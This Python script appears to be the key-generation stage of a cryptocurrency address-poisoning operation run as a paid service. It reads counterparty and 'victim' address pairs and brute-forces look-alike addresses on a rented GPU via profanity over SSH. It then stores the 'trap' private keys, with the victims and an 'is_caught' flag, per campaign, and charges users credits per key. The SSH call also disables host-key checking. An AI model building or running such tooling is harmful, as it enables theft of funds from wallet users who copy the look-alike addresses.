#!/usr/bin/env python3
"""
Batch generation script.
Reads qualified_targets.txt (lines: "Counterparty: 0x... | Victim: 0x..."),
generates vanity addresses for each counterparty using a single Clore.ai GPU rental,
and saves the key along with both addresses in vault.txt.

Resume‑safe: if interrupted, restarting will continue from the last
successfully processed victim (tracked in batch_progress.txt).

Multi‑chain: includes the chain name in vault entries.
"""

import subprocess
import sys
import datetime
import re
import os
import time
import requests
import json
import signal
import argparse

# Add project root to path for shared modules
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.config import config
from lib.logger import logger
from lib.retry import retry
from lib.notifier import send_telegram
from lib.shutdown import setup_graceful_shutdown
from lib.encryption import encrypt

# --- NEW: Import Web3 for address derivation ---
try:
    from web3 import Web3
except ImportError:
    Web3 = None
    logger.warning("web3.py not installed; trap address derivation will be skipped.")

# --- Supabase client for job tracking (NEW) ---
try:
    from supabase import create_client
except ImportError:
    create_client = None

SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
supabase = None
if SUPABASE_URL and SUPABASE_KEY and create_client:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    print("[batch_generate] Supabase client initialized")
else:
    print("[batch_generate] Supabase client NOT initialized")

def update_job(job_id, status=None, progress=None, total=None, message=None):
    """Update job status in Supabase."""
    if not supabase:
        print("[update_job] Supabase client not initialized, cannot update")
        return
    data = {}
    if status is not None:
        data["status"] = status
    if progress is not None:
        data["progress"] = progress
    if total is not None:
        data["total"] = total
    if message is not None:
        data["message"] = message
    if status == "running" and "started_at" not in data:
        data["started_at"] = "now()"
    if status in ("completed", "failed"):
        data["completed_at"] = "now()"
    try:
        print(f"[update_job] Updating job {job_id} with {data}")
        result = supabase.table("jobs").update(data).eq("id", job_id).execute()
        print(f"[update_job] Update successful: {result}")
    except Exception as e:
        print(f"[update_job] Failed to update job {job_id}: {e}")
        logger.error(f"Failed to update job {job_id}: {e}")

def get_campaign_id_from_job(job_id):
    """Retrieve campaign_id from job record."""
    if not supabase:
        return None
    try:
        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
        if result.data:
            return result.data[0]["campaign_id"]
    except Exception as e:
        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
    return None

# ──────────── MISSING FUNCTION ADDED ────────────
def get_user_id_from_campaign(campaign_id):
    """Get user_id from campaign."""
    if not supabase:
        return None
    try:
        result = supabase.table("campaigns").select("user_id").eq("id", campaign_id).execute()
        if result.data:
            return result.data[0]["user_id"]
    except Exception as e:
        logger.error(f"Failed to get user_id for campaign {campaign_id}: {e}")
    return None
# ──────────────────────────────────────────────────

# --- Credit helpers (per-key) ---
def get_user_credits(user_id):
    """Get current credits for a user."""
    if not supabase:
        return 0
    try:
        result = supabase.table("users").select("credits").eq("id", user_id).execute()
        if result.data:
            return float(result.data[0].get("credits", 0))
        else:
            return 0
    except Exception as e:
        logger.error(f"Failed to get credits for user {user_id}: {e}")
        return 0

def deduct_key_fee(user_id, job_id, campaign_id, fee):
    """Deduct fee for one generated key and log transaction."""
    if not supabase:
        return False
    try:
        # Get current credits
        current = get_user_credits(user_id)
        if current < fee:
            logger.warning(f"Insufficient credits to deduct ${fee:.2f} for user {user_id}")
            return False

        new_credits = current - fee
        supabase.table("users").update({"credits": new_credits}).eq("id", user_id).execute()

        # Log transaction
        supabase.table("credit_transactions").insert({
            "user_id": user_id,
            "amount": -fee,
            "type": "fee_deduction",
            "status": "completed",
            "description": f"Generation fee for 1 key",
            "completed_at": "now()"
        }).execute()

        # Log generation history (optional)
        supabase.table("generation_history").insert({
            "job_id": job_id,
            "campaign_id": campaign_id,
            "user_id": user_id,
            "keys_generated": 1,
            "fee": fee
        }).execute()

        logger.info(f"Deducted ${fee:.2f} from user {user_id}, remaining: ${new_credits:.2f}")
        return True
    except Exception as e:
        logger.error(f"Failed to deduct key fee: {e}")
        return False

# --- Multi‑chain: get current chain ---
CHAIN = getattr(config, 'CHAIN', 'ethereum')
chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None
NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'
logger.info(f"Batch generator running on chain: {CHAIN} ({NATIVE_SYMBOL})")

# --- Configuration from central config ---
REMOTE_USER = config.BATCH_REMOTE_USER
REMOTE_HOST = config.BATCH_REMOTE_HOST
REMOTE_PORT = config.BATCH_REMOTE_PORT
REMOTE_PASSWORD = config.BATCH_REMOTE_PASSWORD
REMOTE_PATH = config.BATCH_REMOTE_PATH

CLORE_API_KEY = config.CLORE_API_KEY
CLORE_INSTANCE_ID = config.CLORE_INSTANCE_ID

QUALIFIED_FILE = config.PENDING_FILE
VAULT_FILE = config.VAULT_FILE
PROGRESS_FILE = config.PROGRESS_FILE

# Force stdout to be unbuffered (for legacy print)
# We'll use logger instead, but keep for compatibility
sys.stdout.reconfigure(line_buffering=True)

def log(msg):
    """Legacy log function – we'll use logger.info instead."""
    logger.info(msg)

def extract_pairs_from_qualified(file_path):
    """
    Read qualified file and return a list of tuples (counterparty, victim)
    in order they appear. Skips zero address.
    """
    pairs = []
    seen = set()
    ZERO_ADDRESS = "0x0000000000000000000000000000000000000000"
    if not os.path.exists(file_path):
        logger.error(f"File {file_path} not found.")
        return pairs
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            match = re.search(r'Counterparty:\s*(0x[a-fA-F0-9]{40})\s*\|\s*Victim:\s*(0x[a-fA-F0-9]{40})', line, re.IGNORECASE)
            if match:
                cp = match.group(1).lower()
                v = match.group(2).lower()
                if cp != ZERO_ADDRESS and cp not in seen:
                    seen.add(cp)
                    pairs.append((cp, v))
            else:
                if re.match(r'^0x[a-fA-F0-9]{40}$', line, re.IGNORECASE):
                    addr = line.lower()
                    if addr != ZERO_ADDRESS and addr not in seen:
                        seen.add(addr)
                        pairs.append((addr, "Unknown"))
    logger.info(f"Found {len(pairs)} unique pairs in {file_path}")
    return pairs

def load_processed_counterparties(vault_path):
    processed = set()
    if not os.path.exists(vault_path):
        return processed
    with open(vault_path, 'r') as f:
        for line in f:
            # We match Counterparty regardless of Chain field
            match = re.search(r'Counterparty:\s*(0x[a-fA-F0-9]{40})', line)
            if match:
                processed.add(match.group(1).lower())
    logger.info(f"Already processed {len(processed)} counterparties (from vault.txt)")
    return processed

def read_progress():
    if not os.path.exists(PROGRESS_FILE):
        return -1
    try:
        with open(PROGRESS_FILE, 'r') as f:
            return int(f.read().strip())
    except:
        return -1

def write_progress(index):
    with open(PROGRESS_FILE, 'w') as f:
        f.write(str(index))

@retry(max_attempts=3, base_delay=2, exceptions=(Exception,))
def generate_key_for_counterparty(counterparty_address):
    """
    Connect to the remote GPU, run profanity with the counterparty's prefix/suffix,
    and return the private key (with 0x prefix) if found, else None.
    """
    addr = counterparty_address.lower().replace("0x", "")
    prefix = addr[:4]
    suffix = addr[-4:]

    wildcard = "X" * (40 - 4 - 4)
    match_pattern = f"{prefix}{wildcard}{suffix}"
    logger.info(f"Processing counterparty {counterparty_address} with pattern {match_pattern}")

    remote_cmd = f"cd {REMOTE_PATH} && ./profanity --matching '{match_pattern}'"
    ssh_cmd = (
        f'sshpass -p "{REMOTE_PASSWORD}" ssh '
        f'-o ConnectTimeout=15 '
        f'-o ServerAliveInterval=60 '
        f'-o StrictHostKeyChecking=no '
        f'-o UserKnownHostsFile=/dev/null '
        f'-p {REMOTE_PORT} '
        f'{REMOTE_USER}@{REMOTE_HOST} "{remote_cmd}"'
    )

    try:
        process = subprocess.Popen(
            ssh_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True,
            bufsize=1
        )

        private_key = None
        key_found = False

        for line in process.stdout:
            # Log the remote output at debug level to avoid clutter
            logger.debug(f"[REMOTE] {line.strip()}")
            if "Private:" in line and "Address:" in line:
                try:
                    key_part = line.split("Private:")[1].split("Address:")[0].strip()
                    addr_part = line.split("Address:")[1].strip().lower()
                    if addr_part.startswith("0x" + prefix) and addr_part.endswith(suffix):
                        private_key = key_part
                        key_found = True
                        logger.info(f"Found matching key for {counterparty_address}")
                        break
                except Exception as e:
                    logger.warning(f"Parse error: {e}")

        if key_found:
            process.terminate()
            time.sleep(0.5)
            if process.poll() is None:
                process.kill()
            return private_key

        # Wait for process to finish (with timeout)
        try:
            process.wait(timeout=60)
        except subprocess.TimeoutExpired:
            process.kill()

        stderr = process.stderr.read()
        if stderr:
            logger.warning(f"SSH remote stderr: {stderr.strip()}")

        return None

    except Exception as e:
        logger.error(f"Error during SSH: {e}")
        raise  # re-raise for retry

# --- MODIFIED: save_key_to_vault now accepts campaign_id and inserts into traps table ---
def save_key_to_vault(counterparty, victim, private_key, campaign_id=None):
    if not private_key:
        return
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Include chain in vault entry for multi‑chain context
    line = f"[{timestamp}] Chain: {CHAIN} | Victim: {victim} | Counterparty: {counterparty} | Key: {private_key}\n"
    encrypted_line = encrypt(line)
    with open(VAULT_FILE, "a") as f:
        f.write(encrypted_line + "\n")  # each encrypted line ends with newline
    logger.info(f"Saved key for counterparty {counterparty} (victim: {victim}, chain: {CHAIN})")

    # --- NEW: Insert into traps table if campaign_id provided ---
    if campaign_id and supabase and Web3:
        try:
            # Derive trap address from private key
            w3 = Web3()
            account = w3.eth.account.from_key(private_key)
            trap_address = account.address.lower()

            # Encrypt private key for database storage (same encryption)
            enc_private = encrypt(private_key)

            data = {
                "campaign_id": campaign_id,
                "victim_address": victim.lower(),
                "counterparty_address": counterparty.lower(),
                "trap_private_key_enc": enc_private,
                "trap_address": trap_address,
                "is_caught": False,
            }
            supabase.table("traps").insert(data).execute()
            logger.info(f"Inserted trap {trap_address} for campaign {campaign_id}")
        except Exception as e:
            logger.error(f"Failed to insert trap into database: {e}")

# def start_clore_instance():
#     """Call Clore API to start the instance."""
#     logger.info("Starting Clore.ai instance...")
#     if not CLORE_API_KEY or not CLORE_INSTANCE_ID:
#         logger.warning("Clore API credentials missing. Skipping start.")
#         return True  # assume already running
#     url = "https://api.clore.ai/v1/instance/start"
#     headers = {
#         "Content-Type": "application/json",
#         "Authorization": f"Bearer {CLORE_API_KEY}"
#     }
#     payload = {"instance_id": CLORE_INSTANCE_ID}
#     try:
#         resp = requests.post(url, json=payload, headers=headers, timeout=10)
#         if resp.status_code == 200:
#             data = resp.json()
#             logger.info(f"Clore API: {data.get('message', 'Start command sent.')}")
#             return True
#         else:
#             logger.error(f"Failed to start instance: {resp.status_code} - {resp.text}")
#             return False
#     except Exception as e:
#         logger.error(f"Error starting instance: {e}")
#         return False

def cancel_clore_instance():
    """Call Clore API to cancel the instance."""
    logger.info("Cancelling Clore.ai instance...")
    if not CLORE_API_KEY or not CLORE_INSTANCE_ID:
        logger.warning("Clore API credentials missing. Skipping cancel.")
        return
    url = "https://api.clore.ai/v1/instance/cancel"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {CLORE_API_KEY}"
    }
    payload = {"instance_id": CLORE_INSTANCE_ID}
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if resp.status_code == 200:
            logger.info("Instance cancelled successfully.")
        else:
            logger.error(f"Failed to cancel instance: {resp.status_code} - {resp.text}")
    except Exception as e:
        logger.error(f"Error cancelling instance: {e}")

def main():
    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('--job-id', help='Job ID for tracking')
    args = parser.parse_args()
    job_id = args.job_id

    campaign_id = None
    user_id = None
    if job_id:
        # Update job to running
        update_job(job_id, status='running')
        print(f"[batch_generate] Job {job_id} set to running")
        campaign_id = get_campaign_id_from_job(job_id)
        if campaign_id:
            user_id = get_user_id_from_campaign(campaign_id)

    # Setup graceful shutdown
    setup_graceful_shutdown()

    # 1. Extract pairs
    pairs = extract_pairs_from_qualified(QUALIFIED_FILE)
    if not pairs:
        logger.error("No pairs found. Exiting.")
        sys.exit(1)

    # 2. Load processed
    processed = load_processed_counterparties(VAULT_FILE)
    pending = [(cp, v) for (cp, v) in pairs if cp not in processed]

    if not pending:
        logger.info("All counterparties already processed. Nothing to do.")
        if job_id:
            update_job(job_id, status='completed', message='All counterparties already processed')
        sys.exit(0)

    total = len(pending)
    logger.info(f"Will process {total} new counterparties (in file order).")
    if job_id:
        update_job(job_id, total=total)

    # 3. Resume
    last_done = read_progress()
    start_index = last_done + 1
    if start_index >= total:
        logger.info("All victims already completed in a previous run.")
        if job_id:
            update_job(job_id, status='completed', progress=total, message='All victims completed in previous run')
        sys.exit(0)

    if start_index > 0:
        logger.info(f"Resuming from counterparty {start_index+1} of {total}")
        pending = pending[start_index:]

    # 4. Start GPU (if needed) – commented out
    # if not start_clore_instance():
    #     logger.error("Failed to start Clore instance. Exiting.")
    #     sys.exit(1)

    # 5. Process with per-key credit checks
    fee_per_key = float(os.getenv("FEE_PER_KEY", "1.0"))
    success_count = 0
    stopped_due_to_credits = False

    for idx, (cp, victim) in enumerate(pending, start=start_index+1):
        # Check credit before attempting to generate next key
        if campaign_id and user_id:
            credits = get_user_credits(user_id)
            if credits < fee_per_key:
                logger.info(f"Insufficient credits to generate more keys. Generated {success_count} keys so far. Stopping.")
                stopped_due_to_credits = True
                break  # exit loop

        logger.info(f"[{idx}/{total}] Generating key for counterparty {cp} (victim: {victim})...")
        try:
            key = generate_key_for_counterparty(cp)
            if key:
                save_key_to_vault(cp, victim, key, campaign_id)
                success_count += 1
                write_progress(idx)
                # Deduct fee after successful generation (if campaign context exists)
                if campaign_id and user_id:
                    deduct_key_fee(user_id, job_id, campaign_id, fee_per_key)
                if job_id:
                    update_job(job_id, progress=idx)
            else:
                logger.warning(f"Failed to generate key for {cp}")
        except Exception as e:
            logger.error(f"Error processing {cp}: {e}")
            # Continue to next key

    logger.info(f"Generated {success_count} keys out of {total}.")

    # 6. Cancel instance
    cancel_clore_instance()

    # Final job status update
    if job_id:
        if success_count == total and not stopped_due_to_credits:
            update_job(job_id, status='completed', progress=total, message='All done')
        elif stopped_due_to_credits:
            update_job(job_id, status='completed', progress=success_count, message=f'Partial: {success_count}/{total} keys (insufficient credits)')
        else:
            update_job(job_id, status='failed', progress=success_count, message=f'{success_count}/{total} succeeded')

    # Send completion alert with campaign_id for per-user Telegram
    status_message = f"🏁 Batch generation complete\nChain: {CHAIN}\nProcessed: {total} targets\nGenerated: {success_count} keys"
    if stopped_due_to_credits:
        status_message += f"\n⚠️ Stopped early due to insufficient credits."
    send_telegram(status_message, campaign_id=campaign_id)

if __name__ == "__main__":
    main()